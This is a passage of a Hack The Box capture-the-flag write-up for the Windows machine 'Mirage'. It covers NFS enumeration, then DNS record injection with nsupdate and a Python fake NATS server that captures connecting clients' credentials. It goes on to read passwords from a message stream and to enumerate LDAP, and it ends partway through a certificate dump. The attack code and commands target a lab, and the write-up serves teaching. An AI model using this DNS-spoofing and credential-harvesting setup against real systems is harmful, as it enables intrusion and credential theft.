---
title: Mirage [Hard]
date: 2025-07-22
tags: [htb, windows, nmap, smb, ldap, kerberos, runascs, secretsdump, evil-winrm, ldapsearch, nxc, gMSADumper, bloodhound, nfs, dns spoofing, pdf, nats, kerberoasting, logon hours, winpeas, dacl abuse, forcechangepassword, readGMSApassword, esc10, s4u2proxy, certipy, bloodyAD, secretsdump, dcsync]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/mirage-htb-season8
image: /assets/img/mirage-htb-season8/mirage-htb-season8_banner.png
---

# Mirage HTB Season 8
## Machine information
Author: [EmSec](https://app.hackthebox.com/users/962022) and [ctrlzero](https://app.hackthebox.com/users/168546)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.254.128                                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 17:01 EDT
Nmap scan report for 10.129.254.128
Host is up (0.17s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-20 21:01:48Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
2049/tcp open  mountd        1-3 (RPC #100005)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2s
| smb2-time: 
|   date: 2025-07-20T21:02:42
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 169.73 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.254.128     dc01.mirage.htb mirage.htb
```

So this machine does not have provided credentials, but we found this in the nmap scan:
```bash
2049/tcp open  mountd        1-3 (RPC #100005)
```

Searching and found out this [link](https://linux.die.net/man/8/mountd) about `mountd` service. <br>
&rarr; `mountd` is a daemon that provides a mount protocol for the NFS protocol so let's recon this service.

### NFS Enumeration
Found this [link](https://www.netexec.wiki/nfs-protocol/enumeration) about NFS enumeration.
```bash
└─$ nxc nfs 10.129.254.128 --shares
NFS         10.129.254.128  2049   10.129.254.128   [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.254.128  2049   10.129.254.128   [*] Enumerating NFS Shares
NFS         10.129.254.128  2049   10.129.254.128   UID        Perms    Storage Usage    Share                          Access List    
NFS         10.129.254.128  2049   10.129.254.128   ---        -----    -------------    -----                          -----------    
NFS         10.129.254.128  2049   10.129.254.128   4294967294 r--      16.2GB/19.8GB    /MirageReports                 No network
```

There is a share called `MirageReports` and let's mount it. <br>
&rarr; Let's check the content of the share.

```bash
└─$ nxc nfs 10.129.254.128 --share '/MirageReports' --ls '/'
NFS         10.129.254.128  2049   10.129.254.128   [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.254.128  2049   10.129.254.128   UID        Perms  File Size     File Path
NFS         10.129.254.128  2049   10.129.254.128   ---        -----  ---------     ---------
NFS         10.129.254.128  2049   10.129.254.128   4294967294 dr--   64.0B         /MirageReports/.
NFS         10.129.254.128  2049   10.129.254.128   4294967294 dr--   64.0B         /MirageReports/..
NFS         10.129.254.128  2049   10.129.254.128   4294967294 -r-x   8.1MB         /MirageReports/Incident_Report_Missing_DNS_Record_nats-svc.pdf
NFS         10.129.254.128  2049   10.129.254.128   4294967294 -r-x   8.9MB         /MirageReports/Mirage_Authentication_Hardening_Report.pdf
```

Now we need to mount the share to our local machine. Got this [link](https://hackviser.com/tactics/pentesting/services/nfs) about mounting NFS shares.

```bash
└─$ mkdir mirage_reports_files

└─$ sudo mount -t nfs 10.129.254.128:/MirageReports mirage_reports_files

└─$ cd mirage_reports_files 

└─$ ls    
Incident_Report_Missing_DNS_Record_nats-svc.pdf  Mirage_Authentication_Hardening_Report.pdf
```

### PDF hint
Checking out the `Incident_Report_Missing_DNS_Record_nats-svc.pdf` file and found there is another hostname `nats-svc.mirage.htb`. <br>

![mirage](/assets/img/mirage-htb-season8/mirage-htb-season8_pdf_hint.png)

Add it to `/etc/hosts` file:
```bash
10.129.254.128     dc01.mirage.htb mirage.htb nats-svc.mirage.htb
```

Here is the summary of two files: <br>
- DNS Record Missing Issue:
    - nats-svc.mirage.htb DNS record missing from DNS zone
    - DNS scavenging automatically deletes records after 14 days (7-day no-refresh + 7-day refresh interval)
    - DHCP lease records show nats-svc machine offline >14 days
- DNS Scavenging Vulnerability:
    - Event ID 2501 (scavenging started) and 2502 (scavenging completed)
    - Dynamic DNS records are automatically deleted when not refreshed
    - No-refresh interval: 7 days
    - Refresh interval: 7 days

&rarr; So we know that applications have **hardcoded service names** like `nats-svc.mirage.htb`, if DNS record is missing, apps will still try to connect to that hostname. <br>
&rarr; We can leverage to hijack DNS records by DNS spoofing.

### DNS Spoofing
But we can not see the port of the NATS service, so we google and found out that the default port is `4222`.
```bash
└─$ sudo nmap -p4222 -sC -sV 10.129.254.128 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 18:09 EDT
Nmap scan report for dc01.mirage.htb (10.129.254.128)
Host is up (0.16s latency).

PORT     STATE SERVICE         VERSION
4222/tcp open  vrml-multi-use?
| fingerprint-strings: 
|   GenericLines: 
|     INFO {"server_id":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","server_name":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":81,"client_ip":"10.10.14.54","xkey":"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX"} 
|     -ERR 'Authorization Violation'
|   GetRequest: 
|     INFO {"server_id":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","server_name":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":82,"client_ip":"10.10.14.54","xkey":"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX"} 
|     -ERR 'Authorization Violation'
|   HTTPOptions: 
|     INFO {"server_id":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","server_name":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":83,"client_ip":"10.10.14.54","xkey":"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX"} 
|     -ERR 'Authorization Violation'
|   NULL: 
|     INFO {"server_id":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","server_name":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":80,"client_ip":"10.10.14.54","xkey":"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX"} 
|_    -ERR 'Authentication Timeout'
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4222-TCP:V=7.95%I=7%D=7/20%Time=687D6935%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1CF,"INFO\x20{\"server_id\":\"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEY
SF:LZIK6FCWXRG2TH3FIL\",\"server_name\":\"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFAB
SF:LTRKEYLZIK6FCWXRG2TH3FIL\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_c
SF:ommit\":\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"por
SF:t\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":104857
SF:6,\"jetstream\":true,\"client_id\":80,\"client_ip\":\"10\.10\.14\.54\",
SF:\"xkey\":\"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX\"}\
SF:x20\r\n-ERR\x20'Authentication\x20Timeout'\r\n")%r(GenericLines,1D0,"IN
SF:FO\x20{\"server_id\":\"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXR
SF:G2TH3FIL\",\"server_name\":\"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK
SF:6FCWXRG2TH3FIL\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"
SF:a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\
SF:"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstr
SF:eam\":true,\"client_id\":81,\"client_ip\":\"10\.10\.14\.54\",\"xkey\":\
SF:"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX\"}\x20\r\n-ER
SF:R\x20'Authorization\x20Violation'\r\n")%r(GetRequest,1D0,"INFO\x20{\"se
SF:rver_id\":\"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL\",
SF:\"server_name\":\"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3
SF:FIL\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\
SF:"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"headers\":
SF:true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":true,
SF:\"client_id\":82,\"client_ip\":\"10\.10\.14\.54\",\"xkey\":\"XCDDF6U5PY
SF:TNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX\"}\x20\r\n-ERR\x20'Autho
SF:rization\x20Violation'\r\n")%r(HTTPOptions,1D0,"INFO\x20{\"server_id\":
SF:\"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL\",\"server_n
SF:ame\":\"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL\",\"ve
SF:rsion\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"go\":\"go
SF:1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"headers\":true,\"aut
SF:h_required\":true,\"max_payload\":1048576,\"jetstream\":true,\"client_i
SF:d\":83,\"client_ip\":\"10\.10\.14\.54\",\"xkey\":\"XCDDF6U5PYTNX2WMFM5U
SF:XN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX\"}\x20\r\n-ERR\x20'Authorization\x
SF:20Violation'\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.97 seconds
```

Ok, let's start to exploit this.

First, we need to setup a fake NATS Server.
```py
#!/usr/bin/env python3
import socket
import json
import re

def extract_creds(data):
    if b"CONNECT" in data:
        try:
            # Find JSON in CONNECT message
            text = data.decode('utf-8', errors='ignore')
            match = re.search(r'CONNECT\s+({[^}]+})', text)
            if match:
                creds = json.loads(match.group(1))
                if 'user' in creds and 'pass' in creds:
                    print(f"🎯 FOUND: {creds['user']}:{creds['pass']}")
                    return True
        except:
            pass
    return False

def run_honeypot(host="0.0.0.0", port=4222):
    with socket.socket() as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(5)
        
        print(f"🍯 NATS Honeypot on {host}:{port}")
        
        while True:
            try:
                client, addr = s.accept()
                print(f"📡 {addr[0]}:{addr[1]}")
                
                with client:
                    # Send minimal NATS INFO
                    info = '{"server_id":"HONEY","version":"2.11.3","auth_required":true}'
                    client.send(f"INFO {info}\r\n".encode())
                    
                    # Read client data
                    data = client.recv(2048)
                    if data:
                        print(f"📨 {data[:100]}...")
                        extract_creds(data)
                    
                    # Send auth error
                    client.send(b"-ERR 'Bad Credentials'\r\n")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"❌ {e}")

if __name__ == "__main__":
    run_honeypot()
```

```bash
└─$ python3 fake_nats_server.py       
🍯 NATS Honeypot on 0.0.0.0:4222
```

Then we will DNS Spoofing. So we gonna use [nsupdate](https://linux.die.net/man/8/nsupdate) to inject fake DNS records.

```bash
└─$ nsupdate                                                          
> server 10.129.254.128
> update add nats-svc.mirage.htb 3600 A 10.10.14.54
> send
```

Now check back our honeypot.

```bash
└─$ python3 fake_nats_server.py       
🍯 NATS Honeypot on 0.0.0.0:4222
📡 10.129.254.128:51943
📨 b'CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_re'...
🎯 FOUND: Dev_Account_A:hx5h7F5554fP@1337!
```

Got the `Dev_Account_A:hx5h7F5554fP@1337!` credentials. <br>
&rarr; Now we gonna data exfiltrate from this credentials.

### NATS
We need to install `nats` first. Head to [natscli](https://github.com/nats-io/natscli) and grab the command to download the `nats`.
```bash
└─$ go install github.com/nats-io/natscli/nats@latest    
go: downloading github.com/nats-io/natscli v0.2.4
go: github.com/nats-io/natscli/nats@latest: github.com/nats-io/natscli@v0.2.4 requires go >= 1.23.9 (running go 1.23.2)
```

So we need to upgrade our go version. Go to [go.dev](https://go.dev/doc/install) and follow the instructions to install the latest version of go.

Now let's start verify the credentials.

```bash
└─$ nats --server nats://10.129.254.128:4222 \
     --user Dev_Account_A \
     --password 'hx5h7F5554fP@1337!' \
     --timeout 5s \
     account info
Account Information

                           User: Dev_Account_A
                        Account: dev
                        Expires: never
                      Client ID: 1,179
                      Client IP: 10.10.14.54
                            RTT: 181ms
              Headers Supported: true
                Maximum Payload: 1.0 MiB
                  Connected URL: nats://10.129.254.128:4222
              Connected Address: 10.129.254.128:4222
            Connected Server ID: NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL
       Connected Server Version: 2.11.3
                 TLS Connection: no

JetStream Account Information:

Account Usage:

                        Storage: 570 B
                         Memory: 0 B
                        Streams: 1
                      Consumers: 0

Account Limits:

            Max Message Payload: 1.0 MiB

  Tier: Default:

      Configuration Requirements:

        Stream Requires Max Bytes Set: false
         Consumer Maximum Ack Pending: Unlimited

      Stream Resource Usage Limits:

                               Memory: 0 B of Unlimited 
                    Memory Per Stream: Unlimited
                              Storage: 570 B of Unlimited (1.0 MiB reserved)
                   Storage Per Stream: Unlimited
                              Streams: 1 of Unlimited
                            Consumers: 0 of Unlimited
```

Next, we will enumerate the available data streams.

```bash
└─$ nats --server nats://10.129.254.128:4222 \
     --user Dev_Account_A \
     --password 'hx5h7F5554fP@1337!' \
     stream ls
╭─────────────────────────────────────────────────────────────────────────────────╮
│                                     Streams                                     │
├───────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤
│ Name      │ Description │ Created             │ Messages │ Size  │ Last Message │
├───────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤
│ auth_logs │             │ 2025-05-05 03:18:19 │ 5        │ 570 B │ 77d8h44m21s  │
╰───────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯
```

Found one stream called `auth_logs`. <br>
&rarr; Let's check details info about this stream.

```bash
└─$ nats --server nats://10.129.254.128:4222 \
     --user Dev_Account_A \
     --password 'hx5h7F5554fP@1337!' \
     stream info auth_logs
Information for Stream auth_logs created 2025-05-05 03:18:19

                Subjects: logs.auth
                Replicas: 1
                 Storage: File

Options:

               Retention: Limits
         Acknowledgments: true
          Discard Policy: New
        Duplicate Window: 2m0s
              Direct Get: true
    Allows Batch Publish: false
         Allows Counters: false
       Allows Msg Delete: false
  Allows Per-Message TTL: false
            Allows Purge: false
          Allows Rollups: false

Limits:

        Maximum Messages: 100
     Maximum Per Subject: unlimited
           Maximum Bytes: 1.0 MiB
             Maximum Age: unlimited
    Maximum Message Size: unlimited
       Maximum Consumers: unlimited

State:

            Host Version: 2.11.3
      Required API Level: 0 hosted at level 1
                Messages: 5
                   Bytes: 570 B
          First Sequence: 1 @ 2025-05-05 03:18:56
           Last Sequence: 5 @ 2025-05-05 03:19:27
        Active Consumers: 0
      Number of Subjects: 1
```

So we know that this stream is used to store the authentication logs. <br>
&rarr; Let's create a new consumer to read the messages in this stream.

```bash
└─$ nats --server nats://10.129.254.128:4222 \
     --user Dev_Account_A \
     --password 'hx5h7F5554fP@1337!' \
     consumer add auth_logs test --pull --ack explicit
? Start policy (all, new, last, subject, 1h, msg sequence) all
? Replay policy instant
? Filter Stream by subjects (blank for all) 
? Maximum Allowed Deliveries -1
? Maximum Acknowledgments Pending 0
? Deliver headers only without bodies No
? Add a Retry Backoff Policy No
Information for Consumer auth_logs > test created 2025-07-21 12:05:28

Configuration:

                    Name: test
               Pull Mode: true
          Deliver Policy: All
              Ack Policy: Explicit
                Ack Wait: 30.00s
           Replay Policy: Instant
         Max Ack Pending: 1,000
       Max Waiting Pulls: 512

State:

            Host Version: 2.11.3
      Required API Level: 0 hosted at level 1
  Last Delivered Message: Consumer sequence: 0 Stream sequence: 0
    Acknowledgment Floor: Consumer sequence: 0 Stream sequence: 0
        Outstanding Acks: 0 out of maximum 1,000
    Redelivered Messages: 0
    Unprocessed Messages: 5
           Waiting Pulls: 0 of maximum 512
```

Now let's read the messages in this stream.

```bash
└─$ nats --server nats://10.129.254.128:4222 \
     --user Dev_Account_A \
     --password 'hx5h7F5554fP@1337!' \
     consumer next auth_logs test --count=10
[05:05:48] subj: logs.auth / tries: 1 / cons seq: 1 / str seq: 1 / pending: 4

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[05:05:48] subj: logs.auth / tries: 1 / cons seq: 2 / str seq: 2 / pending: 3

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[05:05:49] subj: logs.auth / tries: 1 / cons seq: 3 / str seq: 3 / pending: 2

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[05:05:49] subj: logs.auth / tries: 1 / cons seq: 4 / str seq: 4 / pending: 1

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[05:05:50] subj: logs.auth / tries: 1 / cons seq: 5 / str seq: 5 / pending: 0

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

nats: error: no message received: nats: timeout
```

Nailed another credentials `david.jjackson:pN8kQmn6b86!1234@`. <br>
&rarr; To make sure, we gonna verify with kerberos authentication.

### Kerberos
```bash
└─$ nxc smb dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -d mirage.htb -k --generate-krb5-file krb5.conf 
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
```

So this one is a valid credentials. <br>
&rarr; Let's recon with this credentials.

First, gonna generate a `krb5.conf` file.

```bash
└─$ sudo nxc smb dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -d mirage.htb -k --generate-krb5-file /etc/krb5.conf
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
```

```bash
└─$ cat krb5.conf          

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = MIRAGE.HTB

[realms]
    MIRAGE.HTB = {
        kdc = dc01.mirage.htb
        admin_server = dc01.mirage.htb
        default_domain = mirage.htb
    }

[domain_realm]
    .mirage.htb = MIRAGE.HTB
    mirage.htb = MIRAGE.HTB
```

Now gonna use [ldapsearch](https://linux.die.net/man/1/ldapsearch) to enumerate the users in the domain.

```bash
└─$ ldapsearch -H ldap://10.129.254.128 -D "david.jjackson@mirage.htb" -w 'pN8kQmn6b86!1234@' -b "dc=mirage,dc=htb" "(objectClass=user)"
# extended LDIF
#
# LDAPv3
# base <dc=mirage,dc=htb> with scope subtree
# filter: (objectClass=user)
# requesting: ALL
#

# Administrator, Users, mirage.htb
dn: CN=Administrator,CN=Users,DC=mirage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Administrator
description: Built-in account for administering the computer/domain
distinguishedName: CN=Administrator,CN=Users,DC=mirage,DC=htb
instanceType: 4
whenCreated: 20250501074137.0Z
whenChanged: 20250720205851.0Z
uSNCreated: 8196
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=mirage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=mirage,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=mirage,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=mirage,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=mirage,DC=htb
uSNChanged: 159796
name: Administrator
objectGUID:: oBl6BEGDA0myM4hg/1YO7w==
userAccountControl: 1114624
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133969834653264443
lastLogoff: 0
lastLogon: 133975187532337656
logonHours:: ////////////////////////////
pwdLastSet: 133951870988190105
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAT/DJfqqf+OM1JBaZ9AEAAA==
adminCount: 1
accountExpires: 0
logonCount: 3344
sAMAccountName: Administrator
sAMAccountType: 805306368
userPrincipalName: Administrator@mirage.htb
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20250501080946.0Z
dSCorePropagationData: 20250501080946.0Z
dSCorePropagationData: 20250501074223.0Z
dSCorePropagationData: 16010101181216.0Z
lastLogonTimestamp: 133975187317519708
msDS-SupportedEncryptionTypes: 0

# Guest, Users, mirage.htb
dn: CN=Guest,CN=Users,DC=mirage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=mirage,DC=htb
instanceType: 4
whenCreated: 20250501074137.0Z
whenChanged: 20250501074137.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=mirage,DC=htb
uSNChanged: 8197
name: Guest
objectGUID:: 9r98uIQXbkmXAkwwQAq0hA==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAT/DJfqqf+OM1JBaZ9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20250501074223.0Z
dSCorePropagationData: 16010101000001.0Z

# DC01, Domain Controllers, mirage.htb
dn: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
cn: DC01
userCertificate:: MIIF1zCCBL+gAwIBAgITSQAAAAKdYYwFRv00yAAAAAAAAjANBgkqhkiG9w0B
 AQsFADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGbWlyYWdlMRcwFQYDV
 QQDEw5taXJhZ2UtREMwMS1DQTAeFw0yNTA1MDEwNzQ1NTdaFw0yNjA1MDEwNzQ1NTdaMBoxGDAWBg
 NVBAMTD2RjMDEubWlyYWdlLmh0YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMb0aFK
 3Ut2/9Mcul9UqLRrgsIXHLR1j44Op3oeJ4tKkIxbqDOumSwFgxUmUCIgywZtfXW2eYKJDy1HA1o45
 zIUMrTTgFM9RQ7AiVe4C/CksdmBXacnfsfqj/C9oShckzT87Sh5SmE49jhVNEBLV65v0NGuA8yurG
 YZ7nniFwtNnGjuSePMiprH9cGmJTJpzX3O/U/+veS0/kZ3Z0HS9ec9X2ObuM1XUV8Ay2DRgxITVnj
 jn8ddCzvCnQfdmvdsa3lVinWGTvVrhj7JQAgQEoKxJd73KCojquCG1s1XeLzg3gfEgZfy5+Fjn2/e
 QcW+uPTusKXOfShO6qhTmihVhIDECAwEAAaOCAugwggLkMC8GCSsGAQQBgjcUAgQiHiAARABvAG0A
 YQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwD
 gYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQ
 MEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQU
 wBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFKu+17LU15nPyXM4zc7TuHD9TbPIMB8GA1Ud
 IwQYMBaAFOihTyY3rvuMhzKxeb+4dauFGRB8MIHIBgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwO
 i8vL0NOPW1pcmFnZS1EQzAxLUNBLENOPWRjMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcn
 ZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bWlyYWdlLERDPWh0Yj9jZXJ0aWZ
 pY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
 gb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8vQ049bWlyYWdlLURDMDEtQ
 0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3
 VyYXRpb24sREM9bWlyYWdlLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2V
